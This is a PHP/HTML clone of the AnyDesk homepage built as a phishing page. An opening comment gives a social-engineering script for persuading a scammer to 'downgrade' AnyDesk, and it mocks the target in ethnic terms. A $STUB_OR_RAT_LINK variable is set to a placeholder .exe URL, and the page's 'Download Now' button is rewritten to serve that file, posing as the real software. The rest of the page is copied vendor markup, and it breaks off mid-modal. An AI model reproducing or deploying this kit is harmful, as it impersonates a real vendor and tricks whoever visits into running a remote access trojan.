<?php
// How to trick a Scammer into entering the link to the fake website with the malicious file download?

// Social Engineering - If scammer requests you to download the official AnyDesk, let him make thru all the way before connecting his PC to your VM. Tell my fellow indian scammer that it shows some message on your side when he s connecting to you. After telling him that, decline his incoming connection. Make him believe that you run an older version of the AnyDesk and he needs to downgrade his software in order to connect to your end. Make him to go on this website. Tell him that your software told you to tell your technician that just was connecting to your virtual machine and he literally needs to downgrade his Anydesk software to connect. You're all set after this dumbass downloads your file and runs it. When nothing will pop out, just tell him that he should try to run AnyDesk now. After he retries to connect to your computer, allow him to do so.

// Line 442 contains the rest of the PHP script.

// You just put that link to your .EXE file in this variable. The link needs to be full. Make the stub's name legit.
$STUB_OR_RAT_LINK = "someurl://your_file_link_goes_here.com/file.exe";
?>

<html lang="en" dir="ltr">
<head>
		<title>The Fast Remote Desktop Application - AnyDesk</title>
	<meta charset="utf-8">
		<meta name="description" content="Discover AnyDesk, the secure &amp; intuitive remote desktop software, and take advantage of the application's innovative features!">
		<meta http-equiv="x-ua-compatible" content="ie=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
			// Render blocking JS
			if (
				/* This condition checks whether the user has set a site preference for dark mode OR a OS-level preference for Dark Mode AND no site preference */
				localStorage.getItem('color-mode') === 'dark' ||
				(window.matchMedia('(prefers-color-scheme: dark)').matches && !localStorage.getItem('color-mode'))
			) {
				document.documentElement.classList.add("dark-theme");
			}
		</script>

		<link rel="stylesheet" href="static/css/anydesk.min-7c8631.css" type="text/css">
			<link rel="stylesheet" href="static/video-js/video-js.min-3b9d55.css" type="text/css">

		<link rel="apple-touch-icon" sizes="180x180" href="https://anydesk.com/_static/img/favicon/apple-touch-icon.png">
		<link rel="icon" type="image/png" sizes="32x32" href="https://anydesk.com/_static/img/favicon/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="16x16" href="https://anydesk.com/_static/img/favicon/favicon-16x16.png">
		<link rel="mask-icon" href="https://anydesk.com/_static/img/favicon/safari-pinned-tab.svg" color="#fb4137">
		<link rel="shortcut icon" href="https://anydesk.com/favicon.ico">
		<meta name="msapplication-config" content="https://anydesk.com/_static/browserconfig.xml">
		<meta name="theme-color" content="#fb4137">
		<link rel="manifest" href="https://anydesk.com/_static/manifest.json">
		<meta property="og:type" content="website">
		<meta property="og:title" content="">
		<meta property="og:url" content="https://anydesk.com/en">
		<meta property="og:image" content="https://anydesk.com/_static/img/favicon/anydesk_icon.png">
		<meta property="og:site_name" content="AnyDesk">
		<link rel="alternate" href="https://anydesk.com/en" hreflang="en">

			<script type="application/ld+json">
{
	"@context":"https://schema.org",
	"@graph":[
		{
			"@type":"Organization",
			"name":"AnyDesk",
			"url":"https://www.anydesk.com/#organization",
			"sameAs":[
				"https://www.youtube.com/channel/UCFkLwT67lnyruZWVw78-NjA",
				"https://www.linkedin.com/company/anydesk-software-gmbh",
				"https://www.facebook.com/AnyDesk",
				"https://www.twitter.com/anydesk",
				"https://www.wikidata.org/wiki/Q27926810"
			],
			"logo":{
				"@type":"ImageObject",
				"@id":"https://www.anydesk.com/#logo",
				"url":"https://www.anydesk.com/_static/img/logos/anydesk-logo-icon.png",
				"width":512,
				"height":512,
				"caption":"AnyDesk"
			},
			"image":{
				"@id":"https://www.anydesk.com/#logo"
			},
			"contactPoint":[
				{
					"@type": "ContactPoint",
					"telephone": "+49711217246705",
					"contactType": "sales",
					"areaServed": ["DE", "AT", "CH"],
					"availableLanguage": ["EN", "DE"]
				},
				{
					"@type": "ContactPoint",
					"telephone": "+18332693375",
					"contactType": "sales",
					"areaServed": "US",
					"availableLanguage": ["EN", "ES"]
				},
				{
					"@type": "ContactPoint",
					"telephone": "+442080687308",
					"contactType": "sales",
					"areaServed": "GB",
					"availableLanguage": ["EN"]
				},
				{
					"@type": "ContactPoint",
					"telephone": "+18332693375",
					"contactType": "sales",
					"availableLanguage": ["EN", "ES", "FR", "IT", "DE"]
				} 
			],
			"address": [
				{
					"@type": "PostalAddress",
					"streetAddress": "T&#239;&#191;&#189;rlenstra&#239;&#191;&#189;e 2",
					"addressLocality": "Stuttgart",
					"addressRegion": "Baden-W&#239;&#191;&#189;rttemberg",
					"postalCode": "70191",
					"addressCountry": "DE"
				},
				{
					"@type": "PostalAddress",
					"streetAddress": "J&#239;&#191;&#189;gerstra&#239;&#191;&#189;e 51",
					"addressLocality": "Berlin",
					"addressRegion": "Berlin",
					"postalCode": "10117",
					"addressCountry": "DE"
				},
				{
					"@type": "PostalAddress",
					"streetAddress": "2729 State Rd 580",
					"addressLocality": "Clearwater",
					"addressRegion": "FL",
					"postalCode": "33761",
					"addressCountry": "US"
				}
			]
		},
		{
			"@type":"WebSite",
			"@id":"https://www.anydesk.com/#website",
			"url":"https://www.anydesk.com/en/",
			"name":"AnyDesk",
			"publisher":{
				"@id":"https://www.www.anydesk.com/#organization"
			}
		},
		{
			"@type":"WebPage",
			"@id":"https://www.anydesk.com/en/#webpage",
			"url":"https://www.anydesk.com/en",
			"inLanguage":"en-US",
			"name":"AnyDesk: The Fast Remote Desktop Application",
			"isPartOf":{
				"@id":"https://www.anydesk.com/#website"
			},
			"about":{
				"@id":"https://www.anydesk.com/#organization"
			}
		}
	]
}
</script><noscript>
			

<style>
	.collapse{display: block;!important}       .dropdown-menu{display: block;!important}
</style></noscript>
	</head>
	<body>
		<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M8ZZ47G" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
	<div id="page">
			<a id="any-backToTop" class="animated">
	<img src="/_static/icons/white/bold/arrow-up-38ccc5.svg" alt="">
	</a><header>
				<div class="navbar-bg"></div>

<div class="container-white">
    <div class="container pt-1 pos-rel z-index-9999 ">
        <div class="row">
            <div class="col-md-12 text-center text-md-right">
                <div class="any-checkbox-darkmode custom-control custom-checkbox float-left">
                    <input type="hidden" name="__checkbox_" value="">
<input type="checkbox" value="true" class="change-theme pb-0 d-inline-block" id="-true">

<label for="-true" class="change-theme-text font-size-sm bold">
		Light Mode</label>
</div>

                <img src="/_static/img/logos/made-in-europe-white-69e1fc.svg" class="any-logo any-logo-made any-logo-white-germany mt-1 mr-md-2 mr-1" alt="" title="Made in Europe logo">
	<img src="/_static/img/logos/made-in-europe-black-b5a6c7.svg" class="any-logo any-logo-made any-logo-black-germany mt-1 mr-md-2 mr-1" alt="" title="Made in Europe logo">
	<!-- We can't show ZH-TW on the Language selector for Political reasons. Instead we set China language for ZH_TW -->
<select class="selectpicker language-select" data-width="fit">
	<option value="/en" data-lang="en" selected data-icon="flag-icon flag-icon-en">
				English</option>
		<option value="/en-gb" data-lang="en-gb" data-icon="flag-icon flag-icon-en-gb">
				English</option>
		<option value="/en-au" data-lang="en-au" data-icon="flag-icon flag-icon-en-au">
				English</option>
		<option value="/de" data-lang="de" data-icon="flag-icon flag-icon-de">
				Deutsch</option>
		<option value="/fr" data-lang="fr" data-icon="flag-icon flag-icon-fr">
				Fran&#231;ais</option>
		<option value="/it" data-lang="it" data-icon="flag-icon flag-icon-it">
				Italiano</option>
		<option value="/es" data-lang="es" data-icon="flag-icon flag-icon-es">
				Espa&#241;ol</option>
		<option value="/pt" data-lang="pt" data-icon="flag-icon flag-icon-pt">
				Portugu&#234;s</option>
		<option value="/nl" data-lang="nl" data-icon="flag-icon flag-icon-nl">
				Nederlands</option>
		<option value="/pl" data-lang="pl" data-icon="flag-icon flag-icon-pl">
				Polski</option>
		<option value="/el" data-lang="el" data-icon="flag-icon flag-icon-el">
				&#917;&#955;&#955;&#951;&#957;&#953;&#954;&#940;</option>
		<option value="/tr" data-lang="tr" data-icon="flag-icon flag-icon-tr">
				T&#252;rk&#231;e</option>
		<option value="/ru" data-lang="ru" data-icon="flag-icon flag-icon-ru">
				&#1056;&#1091;&#1089;&#1089;&#1082;&#1080;&#1081;</option>
		<option value="/ja" data-lang="ja" data-icon="flag-icon flag-icon-ja">
				&#26085;&#26412;&#35486;</option>
		<option value="/zhs" data-lang="zhs" data-icon="flag-icon flag-icon-zhs">
				&#31616;&#20307;&#20013;&#25991;</option>
		<option value="/zht" data-lang="zht" data-icon="flag-icon flag-icon-zht">
				&#32321;&#39636;&#20013;&#25991;</option>
		<option value="/ko" data-lang="ko" data-icon="flag-icon flag-icon-ko">
				&#54620;&#44397;&#50612;</option>
		</select>
<img src="/_static/icons/red/bold/arrow-down-1-13dd01.svg" class="mr-2 mt-3px" width="15" alt="">
	<a class="border-none" href="tel:" title="Call Sales" data-toggle="modal" data-target="#contactUsModal">
	<img src="/_static/icons/red/bold/phone-circle-186093.svg" class="d-lg-none" width="25" alt="">
	<span class="any-navHoverIcons">
                           <img src="/_static/icons/red/bold/phone-circle-186093.svg" class="d-none d-lg-inline any-navHoverIcon" alt="">
	<span>00 49 711 217246705</span>
                       </span>
                </a><a class="border-none" href="https://support.anydesk.com/knowledge" title="Help Center" target="_blank" rel="noopener noreferrer">
	<img src="/_static/icons/red/bold/question-circle-e166ca.svg" class="d-lg-none" width="25" alt="">
	<span class="any-navHoverIcons">
                           <img src="/_static/icons/red/bold/question-circle-e166ca.svg" class="d-none d-lg-inline any-navHoverIcon" alt="">
	<span>Help Center</span>
                       </span>
                </a></div>
        </div>
    </div>
</div>
<div class="container-nav-bg ">
    <div class="container">
        <nav class="navbar navbar-expand-lg align-items-center">

            <div class="d-flex flex-wrap align-items-center">
                <a class="navbar-logo pb-1 pb-sm-0" href="/en" aria-label="Home">
                    <img src="/_static/img/logos/anydesk-logo-white-red-ec4e3a.png" class="any-logo any-logo-white" alt="" title="AnyDesk logo">
	<img src="/_static/img/logos/anydesk-logo-c0861c.png" class="any-logo any-logo-black" alt="" title="AnyDesk logo">
	</a>
                </div>
            <button class="navbar-toggler collapsed pb-1 pb-sm-0" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Navigation">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav mr-auto">
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown">
                            Why AnyDesk<img src="/_static/icons/white/bold/arrow-down-1-ec7f5c.svg" class="menu-icon-arrow-down-white d-none" width="12" alt="">
	<img src="/_static/icons/black/medium/arrow-down-1-38c71c.svg" class="menu-icon-arrow-down-black" width="12" alt="">
	</a>
                        <div class="dropdown-menu">
                            <div class="">
                                <div class="float-md-left mb-3 mb-md-0 mr-4">
                                    <p class="dropdown-category">
                                        Benefits</p>
                                    <a class="dropdown-item" href="/en/performance">
	Performance</a><a class="dropdown-item" href="/en/customization">
	Customization</a><a class="dropdown-item" href="/en/security">
	Security</a><a class="dropdown-item" href="/en/all-platforms">
	All Platforms</a><a class="dropdown-item" href="/en/case-studies">
	Case Studies</a></div>
                                <div class="float-md-left mb-3 mb-md-0 mr-4">
                                    <p class="dropdown-category">
                                        Features</p>
                                    <a class="dropdown-item" href="/en/features">
	Features Overview</a><a class="dropdown-item" href="/en/features#access-control" rel="relativeanchor">
	Access &amp; Control</a><a class="dropdown-item" href="/en/features#administration-customization" rel="relativeanchor">
	Administration &amp; Customization</a><a class="dropdown-item" href="/en/features#security-privacy" rel="relativeanchor">
	Security &amp; Privacy</a><a class="dropdown-item" href="/en/features#collaboration" rel="relativeanchor">
	Collaboration</a></div>
                                <div class="pos-rel float-md-left">
                                    <p class="dropdown-category">
                                        All Platforms</p>
                                    <a class="dropdown-item" href="/en/downloads/windows">
	Desktop</a><a class="dropdown-item" href="/en/downloads/android">
	Mobile</a><a class="dropdown-item" href="/en/downloads/raspberry-pi">
	More</a></div>
                                <div class="clearfix"></div>
                            </div>
                        </div>
                    </li>
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown">
                            Solutions<img src="/_static/icons/white/bold/arrow-down-1-ec7f5c.svg" class="menu-icon-arrow-down-white d-none" width="12" alt="">
	<img src="/_static/icons/black/medium/arrow-down-1-38c71c.svg" class="menu-icon-arrow-down-black" width="12" alt="">
	</a>
                        <div class="dropdown-menu">
                            <div class="">
                                <div class="float-md-left mb-3 mb-md-0 mr-4">
                                    <p class="dropdown-category">
                                        By Need</p>
                                    <a class="dropdown-item" href="/en/solutions/remote-desktop">
	Remote Desktop</a><a class="dropdown-item" href="/en/solutions/remote-support">
	Remote Support</a><a class="dropdown-item" href="/en/solutions/remote-work">
	Remote Work</a><a class="dropdown-item" href="/en/solutions/remote-access">
	Remote Access</a><a class="dropdown-item" href="/en/solutions/mobile-device-support">
	Mobile Device Support</a><a class="dropdown-item" href="/en/solutions/on-premises">
	Cloud &amp; On-Premises</a><a class="dropdown-item" href="/en/solutions/enterprise-solution">
	Ultimate Solution</a><a class="dropdown-item" href="/en/solutions/remote-collaboration">
	Remote Collaboration</a></div>
                                <div class="float-md-left mb-3 mb-md-0 mr-4">
                                    <p class="dropdown-category">
                                        By Industry</p>
                                    <a class="dropdown-item" href="/en/solutions/education">
	Education</a><a class="dropdown-item" href="/en/solutions/government">
	Government</a><a class="dropdown-item" href="/en/solutions/corporations">
	Corporations</a><a class="dropdown-item" href="/en/solutions/media-creatives">
	Media Creatives</a><a class="dropdown-item" href="/en/solutions/information-technology-services">
	Information Technology<br> &amp; Services</a></div>
                                <div class="pos-rel float-md-left">
                                    <p class="dropdown-category">
                                        By Role</p>
                                    <a class="dropdown-item" href="/en/solutions/it-support">
	Support</a><a class="dropdown-item" href="/en/solutions/it-leader">
	IT Leader</a><a class="dropdown-item" href="/en/solutions/freelancer">
	Freelancer</a><a class="dropdown-item" href="/en/solutions/personal-user">
	Personal User</a><a class="dropdown-item" href="/en/solutions/customer">
	Customer</a></div>
                                <div class="clearfix"></div>
                            </div>
                        </div>
                    </li>
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown">
                            Services<img src="/_static/icons/white/bold/arrow-down-1-ec7f5c.svg" class="menu-icon-arrow-down-white d-none" width="12" alt="">
	<img src="/_static/icons/black/medium/arrow-down-1-38c71c.svg" class="menu-icon-arrow-down-black" width="12" alt="">
	</a>
                        <div class="dropdown-menu">
                            <div class="d-lg-flex justify-content-center">
                                <div class="float-md-left">
                                    <p class="dropdown-category">
                                        Services</p>
                                    <a class="dropdown-item" href="/en/services">
	All Services</a><a class="dropdown-item" href="/en/services/customer-success">
	Customer Success</a><a class="dropdown-item" href="https://support.anydesk.com/knowledge" target="_blank" rel="noopener noreferrer">
	Help Center<img src="/_static/icons/black/bold/keyboard-arrow-top-right-7aaa41.svg" class="ml-0-1" width="10" alt="">
	</a><a class="dropdown-item" href="https://go.anydesk.com" target="_blank" rel="noopener noreferrer">
	go.anydesk.com<img src="/_static/icons/black/bold/keyboard-arrow-top-right-7aaa41.svg" class="ml-0-1" width="10" alt="">
	</a><a class="dropdown-item" href="https://my.anydesk.com" target="_blank" rel="noopener noreferrer">
	my.anydesk.com<img src="/_static/icons/black/bold/keyboard-arrow-top-right-7aaa41.svg" class="ml-0-1" width="10" alt="">
	</a></div>
                                <div class="clearfix"></div>
                            </div>
                        </div>
                    </li>
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown">
                            Company<img src="/_static/icons/white/bold/arrow-down-1-ec7f5c.svg" class="menu-icon-arrow-down-white d-none" width="12" alt="">
	<img src="/_static/icons/black/medium/arrow-down-1-38c71c.svg" class="menu-icon-arrow-down-black" width="12" alt="">
	</a>
                        <div class="dropdown-menu">
                            <div class="d-lg-flex justify-content-center">
                                <div class="float-md-left mb-3 mb-md-0 mr-4">
                                    <p class="dropdown-category">
                                        Company</p>
                                    <a class="dropdown-item" href="/en/leadership-team">
	AnyDesk Team</a><a class="dropdown-item" href="/en/career">
	Career</a><a class="dropdown-item" href="/en/career/jobs#collaboration">
	Open Positions</a><a class="dropdown-item" href="/en/press">
	Press</a><a class="dropdown-item" href="/en/events">
	Events</a></div>
                                <div class="float-md-left mb-3 mb-md-0 mr-4">
                                    <p class="dropdown-category">
                                        Partners</p>
                                    <a class="dropdown-item" href="/en/partners">
	Partner Community</a><a class="dropdown-item" href="/en/partners#join" rel="relativeanchor">
	Become a Partner</a><a class="dropdown-item" href="https://anydesk.channeltivity.com/Login" target="_blank" rel="noopener noreferrer">
	Partner Login<img src="/_static/icons/black/bold/keyboard-arrow-top-right-7aaa41.svg" class="ml-0-1" width="10" alt="">
	</a><a class="dropdown-item" href="/en/partners/integration">
	Integration Partners</a><a class="dropdown-item" href="/en/partners/influencer">
	Affiliates &amp; Influencers</a></div>
                                <div class="float-md-left mb-3 mb-md-0 mr-4">
                                    <p class="dropdown-category">
                                        Resources</p>
                                    <a class="dropdown-item" href="/en/case-studies">
	Case Studies</a><a class="dropdown-item" href="https://blog.anydesk.com/">
	Blog</a><a class="dropdown-item" href="/en/stories">
	AnyDesk Stories</a><a class="dropdown-item" href="/en/resources">
	Resources Hub</a><a class="dropdown-item" href="https://www.youtube.com/playlist?list=PLlEnzX2FLqbs_GC8rUUn4I5rwMJFwki8n" target="_blank" rel="noopener noreferrer">
	Tutorials<img src="/_static/icons/black/bold/keyboard-arrow-top-right-7aaa41.svg" class="ml-0-1" width="10" alt="">
	</a><a class="dropdown-item" href="https://support.anydesk.com/knowledge" target="_blank" rel="noopener noreferrer">
	Help Center<img src="/_static/icons/black/bold/keyboard-arrow-top-right-7aaa41.svg" class="ml-0-1" width="10" alt="">
	</a></div>
                                <div class="float-md-left">
                                    <p class="dropdown-category">
                                        Contact</p>
                                    <a class="dropdown-item" href="/en/support/contact-us">
	Contact</a></div>
                                <div class="clearfix"></div>
                            </div>
                        </div>
                    </li>
                    <li class="nav-item ">
                        <a class="nav-link nav-link-arrow-right" href="/en/pricing">Buy Now</a>
                    </li>
                </ul>
                <div class="float-right mt-3 mt-lg-0">
                    <a class="btn btn-sm btn-primary mr-1 d-lg-none d-xl-inline-block" href="https://my.anydesk.com">
	<p class="mb-0 d-inline-block">my.anydesk</p>
    </a><a class="d-none d-lg-inline-block d-xl-none" href="https://my.anydesk.com">
	<img src="/_static/icons/red/bold/single-neutral-circle_2-d96f02.svg" class="mr-1" title="my.anydesk.com" width="39" alt="">
	</a><a class="btn btn-sm btn-primary-outline d-lg-none d-xl-inline-block" href="/en/downloads">
	<p class="mb-0 d-inline-block">Downloads</p>
    </a><a class="d-none d-lg-inline-block d-xl-none" href="/en/downloads">
	<img src="/_static/icons/red/bold/download-bottom-278e26.svg" title="Downloads" width="42" alt="">
	</a></div>
            </div>
        </nav>
    </div>
</div></header>
			<div id="content">
				<link rel="stylesheet" href="/_static/css/slick/slick.min-e6e4f1.css" type="text/css">
        <link rel="stylesheet" href="/_static/css/slick/slick-theme.min-7c2e6e.css" type="text/css">

        <!---->

        <div class="container-header mb-0">
		    <div class="container">
		        <div class="row text-center">
					<div class="col-12 justify-content-center mb-2">
                    <center><span class="home-animation-text home-animation-text-left normal">Any|</span>
                    <span class="home-animation-text home-animation-text-right red">Desk</span></center>
                </div>
				<div class="col-lg-8 offset-lg-2 text-center">
                    <p class="h5">Software designed with your wants, needs, and budget in mind.</p>
                    <div class="mb-2">
                        <div class="d-inline-block pt-1 pb-1 pr-1 pl-1 pl-md-0">
                            <a class="btn btn-primary" href="#">
	<p class="mb-0 d-inline-block">Start Business Trial</p>
    </a></div>
                        <div class="d-inline-block pt-1 pb-1 pr-1 pl-1 pl-md-0">
                        
                            <?php echo "<a class='btn btn-primary download-button' href='" . $STUB_OR_RAT_LINK . "'>"; ?>
	
	<p class="mb-0 d-inline-block">Download Now</p>
    </a></div>
                        
                        <p class="mb-0 font-size-xs text-center" id="download-info">&#160;</p>
                        </div>
                </div></div>
		    </div>
		</div>
	<div class="divider-sm"></div>

        <div class="container">
            <div class="row">
                <div class="col-xl-4 text-center text-xl-left z-index-1">
                    <div class="ml-1 ml-xl-3">
                        <p class="h5 bold red">Start using OUR software!</p>
                        <h2 class="h2-3">Why Switch?</h2>
                        <p>Tired of paying more for less? We understand. Switch to AnyDesk and get up to 6 months for free, migration assistance, and a better user experience. Discover what better software means today!</p>
                        <a class="btn btn-primary mt-2 mr-1" href="/en/switch">
	<p class="mb-0 d-inline-block">Do the right thing</p>
    </a><a class="btn btn-primary-outline mt-2" href="https://order.anydesk.com/product?lang=en&amp;prod=standard&amp;promo=JG6K84">
	<p class="mb-0 d-inline-block">Get the Offer</p>
    </a></div>
                </div>
                <div class="col-xl-8 mt-minus-80">
	</div>
            </div>
        </div>

        <div class="divider"></div>

        <div class="container">
            <div class="row">
                <div class="col-md-12 text-center">
        <h2 class="h3 mb-2">Trusted by over 170,000 customers!</h2>
    </div>
        <div class="divider-lg"></div>

        <div class="container-gray">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-md-6 pl-0">
                        <img src="/_static/img/hero/license-configurator-monitor-c44a55.jpg" class="img-fluid mx-auto any-module-hero-imgHidden max-width-922px w-100 darkmode" alt="Monitor showing AnyDesk License Configurator" data-darkmode="/_static/img/hero/darkmode/license-configurator-monitor-a7b8cd.jpg">
	</div>
                    <div class="col-md-6 d-flex align-items-center">
                        <div class="ml-3 ml-xl-4 mt-4 mb-4 mr-2">
                            <h3 class="">Unsure what license<br>fits your needs?</h3>
                            <p class="h5 bold red">We guide through our plans in less than a minute.</p>
                            <a class="btn btn-primary mt-2 mr-1" href="#">
	<p class="mb-0 d-inline-block">Go to the License Configurator</p>
    </a></div>
                    </div>
                </div>
            </div>
        </div>

        <div class="divider-lg"></div>

        <div class="container">
            <div class="row">
                <div class="col-md-12 text-center">
                    <h2 class="h3 mb-4">Experience the AnyDesk difference</h2>
                </div>
                <div class="col-lg-4 p-0 mb-2 mb-lg-0 px-1">
                    <a href="/en/switch#migration-guide" class="any-module-hero-imgBox-wrapperlink" rel="relativeanchor">
	<div class="any-module-hero-imgBox" style="background-image: url(../../../_static/img/resources/hero-box-images/man-sitting-chair-laptop-flamingo.jpg);">
	<div class="any-overlay "></div>
	<div class="pos-rel d-flex justify-content-start align-items-end h-100 p-3">
		<div class="text-left">
			<p class="font-size-lg mb-2 ">Switching<br>Made Easy</p>
			</div>
	</div>
</div>
</a>
	</div>
                <div class="col-lg-4 p-0 mb-2 mb-lg-0 px-1">
                    <a href="/en/switch#hello-anydesk" class="any-module-hero-imgBox-wrapperlink" rel="relativeanchor">
	<div class="any-module-hero-imgBox" style="background-image: url(../../../_static/img/resources/hero-box-images/man-editing-video-monitor.jpg);">
	<div class="any-overlay "></div>
	<div class="pos-rel d-flex justify-content-start align-items-end h-100 p-3">
		<div class="text-left">
			<p class="font-size-lg mb-2 ">What is<br>"Better Software"?</p>
			</div>
	</div>
</div>
</a>
	</div>
                <div class="col-lg-4 p-0 mb-2 mb-lg-0 px-1">
                    <a href="/en/switch#license-configurator" class="any-module-hero-imgBox-wrapperlink" rel="relativeanchor">
	<div class="any-module-hero-imgBox" style="background-image: url(../../../_static/img/resources/hero-box-images/man-coding-monitor.jpg);">
	<div class="any-overlay "></div>
	<div class="pos-rel d-flex justify-content-start align-items-end h-100 p-3">
		<div class="text-left">
			<p class="font-size-lg mb-2 ">What License<br>is right for me?</p>
			</div>
	</div>
</div>
</a>
	</div>
            </div>
        </div>

        <div class="divider"></div>

        <div class="container-gray">
            <div class="divider"></div>
            <div class="container">
                <div class="row text-center">
                    <div class="col-md-12 mb-4">
                        <h3>AnyDesk fits your needs</h3>
                    </div>
                </div>
                <div class="row text-center justify-content-center">
                    <div class="col-sm-6 col-md-4 mb-4 mb-md-0">
                        <div class="px-2 px-xl-3">
        <div class="sameHeight">
        <img src="/_static/icons/red/bold/house-heart-e0e8b5.svg" class="mb-1 mx-auto" width="50" alt="">
	<h3 class="h4 red">Runs in Cloud or On-Premises</h3>
        <p class="mb-0">Choose our cloud solution to benefit from our infrastructure and service or install on your own servers and work completely independently.</p>
            </div>
    <div class="mt-3"></div>
        <a href="/en/solutions/on-premises">
	Learn More</a></div></div>
                    <div class="col-sm-6 col-md-4 mb-4 mb-sm-0">
                        <div class="px-2 px-xl-3">
        <div class="sameHeight">
        <img src="/_static/icons/red/bold/phone-action-check-1-7c275f.svg" class="mb-1 mx-auto" width="50" alt="">
	<h3 class="h4 red">Full mobile support</h3>
        <p class="mb-0">Access and control desktops, servers, machines, and devices via smartphone or tablet. Cross-compatible and platform independent.</p>
            </div>
    <div class="mt-3"></div>
        <a href="/en/solutions/mobile-device-support">
	Learn More</a></div></div>
                    <div class="col-sm-6 col-md-4 mb-0">
                        <div class="px-2 px-xl-3">
        <div class="sameHeight">
        <img src="/_static/icons/red/bold/color-brush-paint-e76bfe.svg" class="mb-1 mx-auto" width="50" alt="">
	<h3 class="h4 red">Flexibility &amp; customization</h3>
        <p class="mb-0">Create your own version of AnyDesk and fit it to your individual needs. Allow a consistent brand experience for your users.</p>
            </div>
    <div class="mt-3"></div>
        <a href="/en/customization">
	Learn More</a></div></div>
                </div>
            </div>
            <div class="divider"></div>
        </div>

        <div class="divider"></div>

        <div class="container">
    <div class="row">

        <div class="col-md-12 text-center">
                <h3 class="mb-0">Recommended by</h3>
                <div class="divider-sm"></div>
            </div>
        <div class="col-sm-4 col-lg-2 offset-lg-3 mb-3 mb-sm-0">
            <img src="/_static/img/badges/industry-leader-cap-badge-5acbb9.jpg" class="img-fluid px-5 px-sm-0 darkmode" alt="" data-darkmode="/_static/img/badges/darkmode/industry-leader-cap-badge-f0443c.jpg">
	</div>
        <div class="col-sm-4 col-lg-2 mb-3 mb-sm-0">
            <img src="/_static/img/badges/industry-leader-g2-badge-371ca7.jpg" class="img-fluid px-5 px-sm-0 darkmode" alt="" data-darkmode="/_static/img/badges/darkmode/industry-leader-g2-badge-701ccd.jpg">
	</div>
        <div class="col-sm-4 col-lg-2">
            <img src="/_static/img/badges/industry-leader-ga-badge-f54883.jpg" class="img-fluid px-5 px-sm-0 darkmode" alt="" data-darkmode="/_static/img/badges/darkmode/industry-leader-ga-badge-afcaf9.jpg">
	</div>
    </div>
</div><div class="divider-lg"></div>

            <div class="container">
                <div class="row text-center">
                    <div class="col-md-12 mb-4">
                        <h3>Join our community</h3>
                    </div>
                    <div class="col-md-12">
        <div class="any-iconWall-sevenRows">
            <a class="any-link-border d-block" href="https://www.instagram.com/anydesksoftware/" target="_blank" rel="noopener noreferrer">
	<img src="/_static/icons/red/bold/social-instagram-63cc5c.svg" class="my-2" width="50" alt="">
	<p>Instagram</p>
                    </a></div>
        <div class="any-iconWall-sevenRows">
            <a class="any-link-border d-block" href="https://www.facebook.com/AnyDesk/" target="_blank" rel="noopener noreferrer">
	<img src="/_static/icons/red/bold/social-media-facebook-338621.svg" class="my-2" width="50" alt="">
	<p>Facebook</p>
                    </a></div>
        <div class="any-iconWall-sevenRows">
            <a class="any-link-border d-block" href="https://de.linkedin.com/company/anydesk-software-gmbh" target="_blank" rel="noopener noreferrer">
	<img src="/_static/icons/red/bold/professional-network-linkedin-5d10a1.svg" class="my-2" width="50" alt="">
	<p>LinkedIn</p>
                    </a></div>
        <div class="any-iconWall-sevenRows">
            <a class="any-link-border d-block" href="https://www.youtube.com/channel/UCFkLwT67lnyruZWVw78-NjA" target="_blank" rel="noopener noreferrer">
	<img src="/_static/icons/red/bold/social-video-youtube-clip-57b798.svg" class="my-2" width="50" alt="">
	<p>Youtube</p>
                    </a></div>
        <div class="any-iconWall-sevenRows">
            <a class="any-link-border d-block" href="https://www.reddit.com/r/AnyDesk/" target="_blank" rel="noopener noreferrer">
	<img src="/_static/icons/red/bold/social-media-reddit-c78a92.svg" class="my-2" width="50" alt="">
	<p>reddit</p>
                    </a></div>
        <div class="any-iconWall-sevenRows">
            <a class="any-link-border d-block" href="https://twitter.com/anydesk" target="_blank" rel="noopener noreferrer">
	<img src="/_static/icons/red/bold/social-media-twitter-eaef5e.svg" class="my-2" width="50" alt="">
	<p>Twitter</p>
                    </a></div>
        <div class="any-iconWall-sevenRows">
            <a class="any-link-border d-block" href="https://www.tiktok.com/@anydesksoftware" target="_blank" rel="noopener noreferrer">
	<img src="/_static/img/icons/tiktok-logo-red-06fc15.svg" class="img-fluid my-2" alt="" width="50">
	<p>TikTok</p>
                    </a></div>
    </div>
</div>
            </div>
        <div class="divider-lg"></div>
    <div class="modal  fade modal-contact" id="contactUsModal" tabindex="-1" role="dialog" aria-labelledby="contactUsModalLabel" aria-hidden="true" data-ref="">
	    <div class="modal-dialog-centered  modal-dialog modal-sm" role="document">
	        <div class="modal-content ">
	            <div class="modal-header text-center">
	            	<h5 class="modal-title" id="contactUsModalLabel">Contact sales</h5>
	            	<button type="button" class="close " data-dismiss="modal" aria-label="Close" data-ref="">
	                <span aria-hidden="true"></span>
	                </button>
	            </div>
	            <div class="modal-body text-center">
	                <p class="mb-0 contact-hover-number">
			<a class="text-deco-none d-block btn-fix-border font-size-md p-1 no-trans" href="tel:0049711217246705">
				<img src="/_static/icons/white/bold/phone-9be7e0.svg" class="phone-icon-white mb-0-1" width="20" alt="">
	00 49 711 217246705<img src="/_static/icons/red/bold/arrow-button-right-1-acd1f2.svg" class="arrow-icon-red ml-7px mb-0-1" width="20" alt="">
	<img src="/_static/icons/white/bold/arrow-button-right-1-d8f1ad.svg" class="arrow-icon-white d-none-normal mb-0-1" width="20" alt="">
	</a>
			</p>
		</div>
	        </div>
	    </div>
	</div>
<div class="modal  fade modal-contact" id="contactUsModalAmericas" tabindex="-1" role="dialog" aria-labelledby="contactUsModalAmericasLabel" aria-hidden="true" data-ref="">
	    <div class="modal-dialog-centered  modal-dialog modal-md" role="document">
	        <div class="modal-content modal-custom">
	            <div class="modal-header text-center">
